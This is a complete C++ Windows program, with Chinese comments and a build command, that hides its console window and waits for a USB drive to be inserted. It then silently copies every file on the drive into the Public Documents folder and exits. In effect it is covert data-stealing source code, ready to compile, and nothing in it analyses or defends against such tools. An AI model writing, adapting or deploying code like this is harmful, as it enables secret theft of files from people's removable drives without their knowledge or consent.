// 编译命令: g++ Upan.cpp -o Upan.exe -mwindows -luser32

#include <iostream>           // 引入输入输出流库
#include <filesystem>         // 引入文件系统库（C++17）
#include <windows.h>          // 引入Windows API

namespace fs = std::filesystem; // 使用文件系统命名空间简化代码

// 函数: FindFile
// 功能: 递归遍历指定目录，将文件复制到公共文档目录
void FindFile(const fs::path& directory) {
    for (const auto& entry : fs::directory_iterator(directory)) { // 遍历目录中的每个条目
        if (entry.is_directory()) { // 如果条目是一个目录
            if (entry.path().filename().string()[0] != '.') { // 排除以.开头的隐藏目录
                FindFile(entry.path()); // 递归调用以遍历子目录
            }
        } else { // 如果条目是一个文件
            // 构建新的文件路径，目标路径为公共文档目录
            std::wstring newpath = L"C:\\Users\\Public\\Documents\\" + entry.path().filename().wstring();
            // 复制文件到目标路径，覆盖已存在的文件
            fs::copy(entry.path(), newpath, fs::copy_options::overwrite_existing);
        }
    }
}

// 主函数: main
int main() {
    HWND hWnd = GetConsoleWindow();           // 获取当前控制台窗口句柄
    ShowWindow(hWnd, SW_HIDE);                // 隐藏控制台窗口

    std::wcout << L"正在检测U盘插拔...\n"; // 输出检测信息

    while (true) {                             // 无限循环，持续检测
        unsigned allDisk = GetLogicalDrives(); // 获取当前所有逻辑驱动器的位掩码

        for (int i = 0; i < 26; ++i) {        // 遍历所有可能的驱动器字母（A-Z）
            wchar_t drive[3];
            drive[0] = L'A' + static_cast<wchar_t>(i); // 设置驱动器字母
            drive[1] = L':';                          // 设置驱动器分隔符
            drive[2] = L'\0';                         // 字符串结束符

            // 检查当前驱动器是否存在且为可移动驱动器（如U盘）
            if ((allDisk & (1 << i)) && GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
                FindFile(drive); // 找到可移动驱动器后，调用FindFile函数处理
                return 0;        // 处理完毕后，退出程序
            }
        }
        Sleep(1000); // 暂停1秒后再次检测
    }
}